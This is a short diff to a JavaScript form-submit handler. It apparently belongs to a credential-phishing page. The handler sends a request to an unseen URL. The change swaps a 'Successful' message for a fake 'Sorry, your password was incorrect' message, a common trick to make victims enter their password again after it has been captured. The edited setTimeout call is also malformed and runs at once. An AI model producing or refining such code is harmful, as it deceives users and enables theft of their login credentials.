@@ -28,9 +28,9 @@ form.addEventListener("submit", (e) => {
         api.open("GET", url, true);
         api.send();
        
-        document.getElementById("alert-message").innerHTML =
-          "Successful";
-      });
+      setTimeout(
+        document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password."
+    ,50000)
 
 
 
